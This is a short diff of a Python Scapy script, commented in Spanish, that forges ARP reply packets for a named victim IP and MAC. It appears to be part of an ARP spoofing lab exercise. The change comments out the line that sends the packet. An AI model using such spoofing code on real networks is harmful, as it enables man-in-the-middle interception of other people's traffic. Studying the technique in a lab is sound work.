@@ -3,7 +3,8 @@
 
 from scapy.all import * 
 # Función para enviar un paquete ARP falsificado 
-def send_arp_packet(target_ip, target_mac, spoofed_ip, spoofed_mac): arp_response = ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac) send(arp_response, verbose=False) 
+def send_arp_packet(target_ip, target_mac, spoofed_ip, spoofed_mac): arp_response = ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac)
+# send(arp_response, verbose=False) 
 # Direcciones MAC e IPs involucradas 
 victim_ip = "192.168.100.197" # IP de la víctima 
 victim_mac = "08:00:27:67:7B:62" # MAC actual de la víctima 
